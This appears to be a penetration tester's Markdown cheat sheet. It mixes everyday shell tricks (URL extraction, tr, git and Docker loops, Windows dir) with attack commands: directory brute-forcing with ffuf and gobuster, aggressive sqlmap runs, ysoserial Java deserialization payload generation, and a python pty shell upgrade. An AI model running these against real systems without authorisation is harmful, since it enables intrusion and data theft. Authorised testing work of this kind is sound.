# Regex

**Extract urls**

```
cat a | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u

cat a | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | tr '[:upper:]' '[:lower:]' | sort -u
```

# tr

**Upper -> lowercase**
```
cat a | tr '[:upper:]' '[:lower:]'
```


**Lower -> uppercase**
```
cat a | tr '[:lower:]' '[:upper:]'
```


# Directory listing


**Download dictionary**
```
wget https://gist.githubusercontent.com/jhaddix/b80ea67d85c13206125806f0828f4d10/raw/c81a34fe84731430741e0463eb6076129c20c4c0/content_discovery_all.txt
```


**ffuf**
```
ffuf -t 10 -u http://url.com/FUZZ -w /root/dict/content_discovery_all.txt -fc "302"
```


**Gobuster**
```
gobuster dir -r -k -u URL -w ../dict/content_discovery_all.txt --wildcard
```


# SQLMap
```
sqlmap -r url.com --level 5 --risk 3 --batch
```


```
for i in $(ls *txt); do sqlmap -r $i --level 3 --risk 3 --dbms=Oracle --ignore-redirects --batch; done
```

# Git


```
for i in $(git log --oneline | cut -d " "  -f 1); do echo; git reset $i; git checkout -- . ; ls ; done
```


# Ysoserial
```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sleep 10' | base64 -w0 -

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sleep 10' | base64 -w0 - | base64 -d  | cut -c 9- | base64 -w0 -; echo

for i in $(cat a | awk '{ print $1 }' ); do java -jar ysoserial-0.0.6-SNAPSHOT-all.jar $i 'sleep 10' | base64 -w0 - | base64 -d  | cut -c 9- | base64 -w0 -; echo; done | tee dict2.txt
```


# Upgrade shell

```
python -c 'import pty; pty.spawn("/bin/bash")'  
```

# Docker

Kill all docker images

```
for i in $(docker ps -a | cut -d " " -f 1 | grep -v CON); do echo $i; docker rm $i; done
```

# Windows cli

## List files recursive

```
dir /s /b /o:gn
```

## Search file extension

```
dir *.chm /s /p
```
